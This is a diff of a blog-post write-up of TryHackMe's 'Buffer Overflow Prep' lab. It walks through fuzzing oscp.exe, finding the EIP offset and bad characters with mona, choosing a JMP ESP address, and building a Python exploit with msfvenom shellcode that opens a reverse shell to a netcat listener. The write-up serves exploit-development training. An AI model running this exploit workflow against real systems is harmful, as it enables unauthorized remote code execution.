@@ -22,14 +22,16 @@ Sep. 6, 2020
     <br>
     <iframe style="border: 0; width: 100%; height: 120px;" src="https://bandcamp.com/EmbeddedPlayer/album=2084875819/size=large/bgcol=333333/linkcol=2ebd35/tracklist=false/artwork=small/track=1526859463/transparent=true/" seamless><a href="http://dubmood.bandcamp.com/album/crackscene-music-best-of-2004-2007-data002">Crackscene music best of 2004-2007 (DATA002) by Dubmood</a></iframe>
     <p>A chiptune track to enjoy along with the post, make sure to visit the link for the full version!</p>
-</div></blockquote>
+</div>
+</blockquote>
 <h2 id="task-1---oscpexe---overflow1">TASK 1 - [oscp.exe - OVERFLOW1]</h2>
 <h3 id="preparations">Preparations</h3>
 <p>We start by deploying the VM and connecting through RDP:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>xfreerdp /u:admin /p:password /cert:ignore /v:10.10.84.54
 </span></span></code></pre></div><p>Once we do that we&rsquo;ll have a remote desktop connection to that machine, we need to start Immunity debugger and then open oscp.exe that is located in the &ldquo;vulnerable apps&rdquo; folder in the Desktop.</p>
 <blockquote>
-<p>We need to remember to click on the &ldquo;play&rdquo; button on Immunity Debugger after opening oscp.exe.</p></blockquote>
+<p>We need to remember to click on the &ldquo;play&rdquo; button on Immunity Debugger after opening oscp.exe.</p>
+</blockquote>
 <p>Once that is ready we should see something like this in our RDP session:</p>
 
     <img src="../img/7501c758c48aeaf265408a8a68f9c040.png"  alt="RDP Session"  class="center"  style="border-radius: 8px;"  />
@@ -106,7 +108,8 @@ Sep. 6, 2020
 
 <p>If we read the room&rsquo;s description of what we just did we get a sense of all the parts involved in this first type of attack.</p>
 <blockquote>
-<p>FROM THM: The fuzzer will send increasingly long strings comprised of As (up to 3000). If the fuzzer crashes the server with one of the strings, you should see an error like: &ldquo;Could not connect to 10.10.84.54:1337&rdquo;. Make a note of the largest number of bytes that were sent.</p></blockquote>
+<p>FROM THM: The fuzzer will send increasingly long strings comprised of As (up to 3000). If the fuzzer crashes the server with one of the strings, you should see an error like: &ldquo;Could not connect to 10.10.84.54:1337&rdquo;. Make a note of the largest number of bytes that were sent.</p>
+</blockquote>
 <h3 id="crash-replication--controlling-eip">Crash Replication &amp; Controlling EIP</h3>
 <p>Create another file on your Kali box called exploit.py with the following contents:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> socket
@@ -196,7 +199,8 @@ Sep. 6, 2020
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">\x</span>01<span style="color:#ae81ff">\x</span>02<span style="color:#ae81ff">\x</span>03<span style="color:#ae81ff">\x</span>04<span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\x</span>06<span style="color:#ae81ff">\x</span>07<span style="color:#ae81ff">\x</span>08<span style="color:#ae81ff">\x</span>09<span style="color:#ae81ff">\x</span>0a<span style="color:#ae81ff">\x</span>0b<span style="color:#ae81ff">\x</span>0c<span style="color:#ae81ff">\x</span>0d<span style="color:#ae81ff">\x</span>0e<span style="color:#ae81ff">\x</span>0f<span style="color:#ae81ff">\x</span>10<span style="color:#ae81ff">\x</span>11<span style="color:#ae81ff">\x</span>12<span style="color:#ae81ff">\x</span>13<span style="color:#ae81ff">\x</span>14<span style="color:#ae81ff">\x</span>15<span style="color:#ae81ff">\x</span>16<span style="color:#ae81ff">\x</span>17<span style="color:#ae81ff">\x</span>18<span style="color:#ae81ff">\x</span>19<span style="color:#ae81ff">\x</span>1a<span style="color:#ae81ff">\x</span>1b<span style="color:#ae81ff">\x</span>1c<span style="color:#ae81ff">\x</span>1d<span style="color:#ae81ff">\x</span>1e<span style="color:#ae81ff">\x</span>1f<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>21<span style="color:#ae81ff">\x</span>22<span style="color:#ae81ff">\x</span>23<span style="color:#ae81ff">\x</span>24<span style="color:#ae81ff">\x</span>25<span style="color:#ae81ff">\x</span>26<span style="color:#ae81ff">\x</span>27<span style="color:#ae81ff">\x</span>28<span style="color:#ae81ff">\x</span>29<span style="color:#ae81ff">\x</span>2a<span style="color:#ae81ff">\x</span>2b<span style="color:#ae81ff">\x</span>2c<span style="color:#ae81ff">\x</span>2d<span style="color:#ae81ff">\x</span>2e<span style="color:#ae81ff">\x</span>2f<span style="color:#ae81ff">\x</span>30<span style="color:#ae81ff">\x</span>31<span style="color:#ae81ff">\x</span>32<span style="color:#ae81ff">\x</span>33<span style="color:#ae81ff">\x</span>34<span style="color:#ae81ff">\x</span>35<span style="color:#ae81ff">\x</span>36<span style="color:#ae81ff">\x</span>37<span style="color:#ae81ff">\x</span>38<span style="color:#ae81ff">\x</span>39<span style="color:#ae81ff">\x</span>3a<span style="color:#ae81ff">\x</span>3b<span style="color:#ae81ff">\x</span>3c<span style="color:#ae81ff">\x</span>3d<span style="color:#ae81ff">\x</span>3e<span style="color:#ae81ff">\x</span>3f<span style="color:#ae81ff">\x</span>40<span style="color:#ae81ff">\x</span>41<span style="color:#ae81ff">\x</span>42<span style="color:#ae81ff">\x</span>43<span style="color:#ae81ff">\x</span>44<span style="color:#ae81ff">\x</span>45<span style="color:#ae81ff">\x</span>46<span style="color:#ae81ff">\x</span>47<span style="color:#ae81ff">\x</span>48<span style="color:#ae81ff">\x</span>49<span style="color:#ae81ff">\x</span>4a<span style="color:#ae81ff">\x</span>4b<span style="color:#ae81ff">\x</span>4c<span style="color:#ae81ff">\x</span>4d<span style="color:#ae81ff">\x</span>4e<span style="color:#ae81ff">\x</span>4f<span style="color:#ae81ff">\x</span>50<span style="color:#ae81ff">\x</span>51<span style="color:#ae81ff">\x</span>52<span style="color:#ae81ff">\x</span>53<span style="color:#ae81ff">\x</span>54<span style="color:#ae81ff">\x</span>55<span style="color:#ae81ff">\x</span>56<span style="color:#ae81ff">\x</span>57<span style="color:#ae81ff">\x</span>58<span style="color:#ae81ff">\x</span>59<span style="color:#ae81ff">\x</span>5a<span style="color:#ae81ff">\x</span>5b<span style="color:#ae81ff">\x</span>5c<span style="color:#ae81ff">\x</span>5d<span style="color:#ae81ff">\x</span>5e<span style="color:#ae81ff">\x</span>5f<span style="color:#ae81ff">\x</span>60<span style="color:#ae81ff">\x</span>61<span style="color:#ae81ff">\x</span>62<span style="color:#ae81ff">\x</span>63<span style="color:#ae81ff">\x</span>64<span style="color:#ae81ff">\x</span>65<span style="color:#ae81ff">\x</span>66<span style="color:#ae81ff">\x</span>67<span style="color:#ae81ff">\x</span>68<span style="color:#ae81ff">\x</span>69<span style="color:#ae81ff">\x</span>6a<span style="color:#ae81ff">\x</span>6b<span style="color:#ae81ff">\x</span>6c<span style="color:#ae81ff">\x</span>6d<span style="color:#ae81ff">\x</span>6e<span style="color:#ae81ff">\x</span>6f<span style="color:#ae81ff">\x</span>70<span style="color:#ae81ff">\x</span>71<span style="color:#ae81ff">\x</span>72<span style="color:#ae81ff">\x</span>73<span style="color:#ae81ff">\x</span>74<span style="color:#ae81ff">\x</span>75<span style="color:#ae81ff">\x</span>76<span style="color:#ae81ff">\x</span>77<span style="color:#ae81ff">\x</span>78<span style="color:#ae81ff">\x</span>79<span style="color:#ae81ff">\x</span>7a<span style="color:#ae81ff">\x</span>7b<span style="color:#ae81ff">\x</span>7c<span style="color:#ae81ff">\x</span>7d<span style="color:#ae81ff">\x</span>7e<span style="color:#ae81ff">\x</span>7f<span style="color:#ae81ff">\x</span>80<span style="color:#ae81ff">\x</span>81<span style="color:#ae81ff">\x</span>82<span style="color:#ae81ff">\x</span>83<span style="color:#ae81ff">\x</span>84<span style="color:#ae81ff">\x</span>85<span style="color:#ae81ff">\x</span>86<span style="color:#ae81ff">\x</span>87<span style="color:#ae81ff">\x</span>88<span style="color:#ae81ff">\x</span>89<span style="color:#ae81ff">\x</span>8a<span style="color:#ae81ff">\x</span>8b<span style="color:#ae81ff">\x</span>8c<span style="color:#ae81ff">\x</span>8d<span style="color:#ae81ff">\x</span>8e<span style="color:#ae81ff">\x</span>8f<span style="color:#ae81ff">\x</span>90<span style="color:#ae81ff">\x</span>91<span style="color:#ae81ff">\x</span>92<span style="color:#ae81ff">\x</span>93<span style="color:#ae81ff">\x</span>94<span style="color:#ae81ff">\x</span>95<span style="color:#ae81ff">\x</span>96<span style="color:#ae81ff">\x</span>97<span style="color:#ae81ff">\x</span>98<span style="color:#ae81ff">\x</span>99<span style="color:#ae81ff">\x</span>9a<span style="color:#ae81ff">\x</span>9b<span style="color:#ae81ff">\x</span>9c<span style="color:#ae81ff">\x</span>9d<span style="color:#ae81ff">\x</span>9e<span style="color:#ae81ff">\x</span>9f<span style="color:#ae81ff">\x</span>a0<span style="color:#ae81ff">\x</span>a1<span style="color:#ae81ff">\x</span>a2<span style="color:#ae81ff">\x</span>a3<span style="color:#ae81ff">\x</span>a4<span style="color:#ae81ff">\x</span>a5<span style="color:#ae81ff">\x</span>a6<span style="color:#ae81ff">\x</span>a7<span style="color:#ae81ff">\x</span>a8<span style="color:#ae81ff">\x</span>a9<span style="color:#ae81ff">\x</span>aa<span style="color:#ae81ff">\x</span>ab<span style="color:#ae81ff">\x</span>ac<span style="color:#ae81ff">\x</span>ad<span style="color:#ae81ff">\x</span>ae<span style="color:#ae81ff">\x</span>af<span style="color:#ae81ff">\x</span>b0<span style="color:#ae81ff">\x</span>b1<span style="color:#ae81ff">\x</span>b2<span style="color:#ae81ff">\x</span>b3<span style="color:#ae81ff">\x</span>b4<span style="color:#ae81ff">\x</span>b5<span style="color:#ae81ff">\x</span>b6<span style="color:#ae81ff">\x</span>b7<span style="color:#ae81ff">\x</span>b8<span style="color:#ae81ff">\x</span>b9<span style="color:#ae81ff">\x</span>ba<span style="color:#ae81ff">\x</span>bb<span style="color:#ae81ff">\x</span>bc<span style="color:#ae81ff">\x</span>bd<span style="color:#ae81ff">\x</span>be<span style="color:#ae81ff">\x</span>bf<span style="color:#ae81ff">\x</span>c0<span style="color:#ae81ff">\x</span>c1<span style="color:#ae81ff">\x</span>c2<span style="color:#ae81ff">\x</span>c3<span style="color:#ae81ff">\x</span>c4<span style="color:#ae81ff">\x</span>c5<span style="color:#ae81ff">\x</span>c6<span style="color:#ae81ff">\x</span>c7<span style="color:#ae81ff">\x</span>c8<span style="color:#ae81ff">\x</span>c9<span style="color:#ae81ff">\x</span>ca<span style="color:#ae81ff">\x</span>cb<span style="color:#ae81ff">\x</span>cc<span style="color:#ae81ff">\x</span>cd<span style="color:#ae81ff">\x</span>ce<span style="color:#ae81ff">\x</span>cf<span style="color:#ae81ff">\x</span>d0<span style="color:#ae81ff">\x</span>d1<span style="color:#ae81ff">\x</span>d2<span style="color:#ae81ff">\x</span>d3<span style="color:#ae81ff">\x</span>d4<span style="color:#ae81ff">\x</span>d5<span style="color:#ae81ff">\x</span>d6<span style="color:#ae81ff">\x</span>d7<span style="color:#ae81ff">\x</span>d8<span style="color:#ae81ff">\x</span>d9<span style="color:#ae81ff">\x</span>da<span style="color:#ae81ff">\x</span>db<span style="color:#ae81ff">\x</span>dc<span style="color:#ae81ff">\x</span>dd<span style="color:#ae81ff">\x</span>de<span style="color:#ae81ff">\x</span>df<span style="color:#ae81ff">\x</span>e0<span style="color:#ae81ff">\x</span>e1<span style="color:#ae81ff">\x</span>e2<span style="color:#ae81ff">\x</span>e3<span style="color:#ae81ff">\x</span>e4<span style="color:#ae81ff">\x</span>e5<span style="color:#ae81ff">\x</span>e6<span style="color:#ae81ff">\x</span>e7<span style="color:#ae81ff">\x</span>e8<span style="color:#ae81ff">\x</span>e9<span style="color:#ae81ff">\x</span>ea<span style="color:#ae81ff">\x</span>eb<span style="color:#ae81ff">\x</span>ec<span style="color:#ae81ff">\x</span>ed<span style="color:#ae81ff">\x</span>ee<span style="color:#ae81ff">\x</span>ef<span style="color:#ae81ff">\x</span>f0<span style="color:#ae81ff">\x</span>f1<span style="color:#ae81ff">\x</span>f2<span style="color:#ae81ff">\x</span>f3<span style="color:#ae81ff">\x</span>f4<span style="color:#ae81ff">\x</span>f5<span style="color:#ae81ff">\x</span>f6<span style="color:#ae81ff">\x</span>f7<span style="color:#ae81ff">\x</span>f8<span style="color:#ae81ff">\x</span>f9<span style="color:#ae81ff">\x</span>fa<span style="color:#ae81ff">\x</span>fb<span style="color:#ae81ff">\x</span>fc<span style="color:#ae81ff">\x</span>fd<span style="color:#ae81ff">\x</span>fe<span style="color:#ae81ff">\x</span>ff
 </span></span></code></pre></div><p>Update your exploit.py script and set the payload variable to the string of bad chars the script generates.</p>
 <blockquote>
-<p>We restart the debugger and load the oscp.exe file, and unpause again.</p></blockquote>
+<p>We restart the debugger and load the oscp.exe file, and unpause again.</p>
+</blockquote>
 <p>then we run <code>python exploit.py</code> again:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/THM/bufferOverflowPrep<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>└─$ python exploit.py      
@@ -210,7 +214,8 @@ Sep. 6, 2020
 <p><code>!mona compare -f C:\mona\oscp\bytearray.bin -a 0191FA30</code></p>
 <p>When we run that Mona command we get the following:</p>
 <blockquote>
-<p>A popup window should appear labelled &ldquo;mona Memory comparison results&rdquo;. If not, use the Window menu to switch to it. The window shows the results of the comparison, indicating any characters that are different in memory to what they are in the generated bytearray.bin file. Not all of these might be badchars! Sometimes badchars cause the next byte to get corrupted as well, or even effect the rest of the string.</p></blockquote>
+<p>A popup window should appear labelled &ldquo;mona Memory comparison results&rdquo;. If not, use the Window menu to switch to it. The window shows the results of the comparison, indicating any characters that are different in memory to what they are in the generated bytearray.bin file. Not all of these might be badchars! Sometimes badchars cause the next byte to get corrupted as well, or even effect the rest of the string.</p>
+</blockquote>
 
     <img src="../img/ab7af4e083517511e66fb6f481ed1a48.png"  alt="Immunity Debugger Console"  class="center"  style="border-radius: 8px;"  />
 
@@ -224,7 +229,8 @@ Sep. 6, 2020
 
 <p>We update the exploit script and remove all badchars we have indentified. Then guess what?</p>
 <blockquote>
-<p>We restart the debugger and load the oscp.exe file, and unpause again.</p></blockquote>
+<p>We restart the debugger and load the oscp.exe file, and unpause again.</p>
+</blockquote>
 <p>We repeat the badchar comparison until the results status returns &ldquo;Unmodified&rdquo;. This indicates that no more badchars exist. This means executing the expliot, running the Mona-look-for-bad-chars-command, if there are new badchars we run mona-generate-new-bytearray-excluding-new-badchards-command, update the exploit. Relaunch everything (Immunity and OSCP.exe).</p>
 <p>So let&rsquo;s check for badchars one more time, we take note of the ESP address:</p>
 
@@ -246,7 +252,7 @@ Sep. 6, 2020
 
 <p>Choose an address and update your exploit.py script, setting the &ldquo;retn&rdquo; variable to the address, written backwards (since the system is little endian). For example if the address is \x01\x02\x03\x04 in Immunity, write it as \x04\x03\x02\x01 in your exploit.</p>
 <p>Ok, we pick up the first address from the list of results. This one:</p>
-<p><code>0x625011af : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll) </code></p>
+<p><code>0x625011af : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll) </code></p>
 <p>The address is <code>0x625011af</code> and we reverse that since the system is little indian we get this <code>fa110526x0</code>. When we need to add this address to our exploit in the return address field.</p>
 <p>Our python exploit now looks like this:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> socket
@@ -316,7 +322,8 @@ Sep. 6, 2020
 </span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\x55\x6b\x3c\x69\x38\x8c\xeb\xae\x45\x0f\x19\x4f\xb2&#34;</span>
 </span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\x0f\x68\x4a\xfe\x97\x81\x26\x6f\x72\xa5\x95\x90\x57&#34;</span>
 </span></span></code></pre></div><blockquote>
-<p>Copy the generated python code and integrate it into your exploit.py script, e.g. by setting the payload variable equal to the buf variable from the code.</p></blockquote>
+<p>Copy the generated python code and integrate it into your exploit.py script, e.g. by setting the payload variable equal to the buf variable from the code.</p>
+</blockquote>
 <p>After we do that the script looks like this:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> socket
 </span></span><span style="display:flex;"><span>
@@ -374,12 +381,14 @@ Sep. 6, 2020
 <p><code>padding = &quot;\x90&quot; * 16</code></p>
 <h3 id="exploit">Exploit!</h3>
 <blockquote>
-<p>With the correct prefix, offset, return address, padding, and payload set, you can now exploit the buffer overflow to get a reverse shell. Start a netcat listener on your Kali box using the LPORT you specified in the msfvenom command (4444 if you didn&rsquo;t change it).</p></blockquote>
+<p>With the correct prefix, offset, return address, padding, and payload set, you can now exploit the buffer overflow to get a reverse shell. Start a netcat listener on your Kali box using the LPORT you specified in the msfvenom command (4444 if you didn&rsquo;t change it).</p>
+</blockquote>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>└─$ nc -lvp <span style="color:#ae81ff">4444</span> 
 </span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">4444</span> ...
 </span></span></code></pre></div><blockquote>
-<p>Restart oscp.exe in Immunity and run the modified exploit.py script again. Your netcat listener should catch a reverse shell!</p></blockquote>
+<p>Restart oscp.exe in Immunity and run the modified exploit.py script again. Your netcat listener should catch a reverse shell!</p>
+</blockquote>
 <p>I&rsquo;m doing something wrong since I&rsquo;m not getting any reverse shell at all, and the debugger is also showing an error&hellip;</p>
 
     <img src="../img/b6e0045aff939d2b636b1e8949f88c63.png"  alt="Immunity Debugger Console"  class="center"  style="border-radius: 8px;"  />
@@ -460,10 +469,12 @@ Sep. 6, 2020
 </span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\a</span>dmin<span style="color:#ae81ff">\D</span>esktop<span style="color:#ae81ff">\v</span>ulnerable-apps<span style="color:#ae81ff">\o</span>scp&gt;
 </span></span></code></pre></div><p>With this we can access the room questions!</p>
 <blockquote>
-<p>Question #1 What is the EIP offset for OVERFLOW1?</p></blockquote>
+<p>Question #1 What is the EIP offset for OVERFLOW1?</p>
+</blockquote>
 <p>We got that one a while back, the offset we found <strong>1978</strong>.</p>
 <blockquote>
-<p>Question #2: In byte order (e.g. \x00\x01\x02) and including the null byte \x00, what were the badchars for OVERFLOW1?</p></blockquote>
+<p>Question #2: In byte order (e.g. \x00\x01\x02) and including the null byte \x00, what were the badchars for OVERFLOW1?</p>
+</blockquote>
 <p>We got those already, after I fucked it up I know. <code>&quot;\x00\x07\x2e\xa0&quot;</code></p>
 <p>That&rsquo;s it for <strong>OVERFLOW1</strong>!</p>
 <p>For the rest of the room we basically need to repeat the same process but for each OVERFLOW command. This time trying to avoid messing up things XD</p>
@@ -475,7 +486,8 @@ Sep. 6, 2020
       <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/F7nCDrf90V8?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"></iframe>
     </div>
 
-Crank that volume up!</p></blockquote>
+Crank that volume up!</p>
+</blockquote>
 <p>[Almost two days later  :stuck_out_tongue_winking_eye: ]</p>
 <p>I took some time off this to learn a bit more about buffer overlows as it started to feel like I knew less than before at some point. Anyways, we are back. I&rsquo;ll point to some resources I found useful when I was trying to understand this stuff:</p>
 <ul>
@@ -485,9 +497,11 @@ Crank that volume up!</p></blockquote>
 </ul>
 <p>While we enjoy Joe Dart&rsquo;s groove, let&rsquo;s start with the second OVERFLOW command! so we can answer the following two questions:</p>
 <blockquote>
-<p>Question #1: What is the EIP offset for OVERFLOW2?</p></blockquote>
+<p>Question #1: What is the EIP offset for OVERFLOW2?</p>
+</blockquote>
 <blockquote>
-<p>Question #2: In byte order (e.g. \x00\x01\x02) and including the null byte \x00, what were the badchars for OVERFLOW2?</p></blockquote>
+<p>Question #2: In byte order (e.g. \x00\x01\x02) and including the null byte \x00, what were the badchars for OVERFLOW2?</p>
+</blockquote>
 <p>We need to basically recreate the same process we followed for the first overflow. Let&rsquo;s outline that process to recall all parts:</p>
 <ol>
 <li>We Fuzz the executable.</li>
@@ -556,10 +570,11 @@ Crank that volume up!</p></blockquote>
 <p>Once we run our script we should see the debugger stops the execution <code>Access Violation when executing [XXXXXXXX]</code></p>
 <p>Now we need to run mona as follows: <code>!mona findmsp -distance 1050</code>:</p>
 <blockquote>
-<p>The findmsp command will find all instances or certain references to a cyclic pattern (a.k.a. “Metasploit pattern”) in memory, registers, etc This command has an important requirement : you have to use a cyclic pattern to trigger a crash in your target application. <a href="https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/">Link to the manual</a></p></blockquote>
+<p>The findmsp command will find all instances or certain references to a cyclic pattern (a.k.a. “Metasploit pattern”) in memory, registers, etc This command has an important requirement : you have to use a cyclic pattern to trigger a crash in your target application. <a href="https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/">Link to the manual</a></p>
+</blockquote>
 <p><img src="https://i.imgur.com/aOyYQZ6.png" alt="We run findmsp command"></p>
 <p>Remember we need to get the offset of EIP here, we are interested in the following line:</p>
-<p><code>Log data, item 18 Address=0BADF00D Message=    EIP contains normal pattern : 0x76413176 (offset 634) </code>
+<p><code>Log data, item 18 Address=0BADF00D Message=    EIP contains normal pattern : 0x76413176 (offset 634) </code>
 We update the <code>offset</code> variable of our script with the value we found. Then we empty the <code>payload</code> variable and set our <code>retn</code> variable to the magic bees <code>BBBB</code>.</p>
 <p>We save the changes to our script, restart everything again and run the exploit once more. We want proof we are overwritting our EIP correctly:</p>
 <p><img src="https://i.imgur.com/FFIrEU9.png" alt="We managed to hit the EIP"></p>
@@ -592,7 +607,7 @@ It is safe to assume that these last codes <code>23 3c 83 ba</code> caused the o
 <p>Now we need to find ourselves a jump point, we do that with Mona and we also use the set of badchars we have identified: <code>!mona jmp -r esp -cpb &quot;\x00\x23\x3c\x83\xba&quot;</code></p>
 <p>I&rsquo;ve selected the second address in the list this time:</p>
 <p><img src="https://i.imgur.com/QKZrsXe.png" alt="Available JMP addresses"></p>
-<p><code>Log data, item 10 Address=625011BB Message=  0x625011bb : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll) </code>
+<p><code>Log data, item 10 Address=625011BB Message=  0x625011bb : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll) </code>
 We use that address in our script inside the <code>retn</code> variable. Remember our second mistake from the first overflow practice. The address needs to be formatted as little endian. <code>\xbb\x11\x50\x62</code>.</p>
 <h3 id="we-make-ourselves-a-payload">We make ourselves a payload</h3>
 <p>We need a payload now, so we can reverse shell the hell out of this excercise. Using <strong>msfvenom</strong> we create the payload taking into account the set of bad chars:</p>
